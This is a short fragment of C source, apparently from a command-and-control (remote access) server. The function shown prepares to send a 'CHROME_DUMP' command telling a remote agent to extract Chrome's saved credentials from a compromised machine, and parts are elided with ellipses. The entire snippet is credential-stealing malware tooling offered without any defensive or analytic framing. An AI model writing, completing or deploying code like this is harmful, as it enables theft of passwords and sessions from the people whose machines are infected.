...
void module_chrome_dump(int client_id) {
    int client_socket = -1;
    int client_index = -1;
    ...
    printf("\n[*] Chrome Credential Dump Module\n");
    printf("[*] Sending extraction command to agent %d...\n\n", client_id);
    
    // Send special command to trigger chrome dump on client
    const char *command = "CHROME_DUMP\n";
